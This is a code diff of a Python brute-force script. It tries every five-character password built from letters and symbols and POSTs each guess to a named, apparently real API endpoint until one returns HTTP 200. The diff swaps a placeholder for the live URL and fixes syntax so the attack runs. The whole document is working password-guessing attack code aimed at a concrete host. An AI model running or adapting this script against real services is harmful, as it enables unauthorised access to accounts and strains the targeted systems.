@@ -2,10 +2,10 @@ import requests
 
 class brute_force:
     def __init__(self):
-        self.endpoint = "endpoint"
+        self.endpoint = "https://mlcasim-api.edwardnafornita.com"
         self.passwordLength = 5
         self.possibleChars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '.', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', '|', ';', ':', ',', '<', '>', '/', '?']
-        self.successful_password
+        self.successful_password = ""
 
     def run(self):
         for a in range(len(self.possibleChars)):
@@ -25,8 +25,9 @@ class brute_force:
                                 "password": password
                             }
 
-                            response = requests.post(endpoint. json=payload)
+                            response = requests.post(self.endpoint, json=payload)
+
+                            print(response)
 
                             if response.status_code == 200:
                                 self.successful_password = password
-
